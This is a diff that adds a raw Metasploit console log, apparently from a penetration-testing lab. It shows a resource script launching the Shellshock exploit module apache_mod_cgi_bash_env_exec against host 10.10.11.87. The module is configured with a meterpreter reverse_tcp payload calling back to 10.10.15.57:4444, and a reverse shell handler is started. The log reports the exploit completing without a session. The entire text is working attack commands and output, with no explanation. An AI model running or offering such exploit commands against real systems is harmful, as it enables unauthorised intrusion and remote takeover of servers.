@@ -1,0 +1,16 @@
+[*] Processing /home/k/hackerEnv/targets/10.10.11.87/metasploit/apache_mod_cgi.rc for ERB directives.
+resource (/home/k/hackerEnv/targets/10.10.11.87/metasploit/apache_mod_cgi.rc)> use exploit/multi/http/apache_mod_cgi_bash_env_exec
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+resource (/home/k/hackerEnv/targets/10.10.11.87/metasploit/apache_mod_cgi.rc)> set RHOSTS 10.10.11.87
+RHOSTS => 10.10.11.87
+resource (/home/k/hackerEnv/targets/10.10.11.87/metasploit/apache_mod_cgi.rc)> set LHOST 10.10.15.57
+LHOST => 10.10.15.57
+resource (/home/k/hackerEnv/targets/10.10.11.87/metasploit/apache_mod_cgi.rc)> set LPORT 4444
+LPORT => 4444
+resource (/home/k/hackerEnv/targets/10.10.11.87/metasploit/apache_mod_cgi.rc)> set TARGETURI /cgi-bin/vulnerable
+TARGETURI => /cgi-bin/vulnerable
+resource (/home/k/hackerEnv/targets/10.10.11.87/metasploit/apache_mod_cgi.rc)> exploit -j -z
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+[*] Starting persistent handler(s)...
+[?1034h[4mmsf[0m exploit([1m[31mmulti/http/apache_mod_cgi_bash_env_exec[0m) [0m> [*] Started reverse TCP handler on 10.10.15.57:4444 
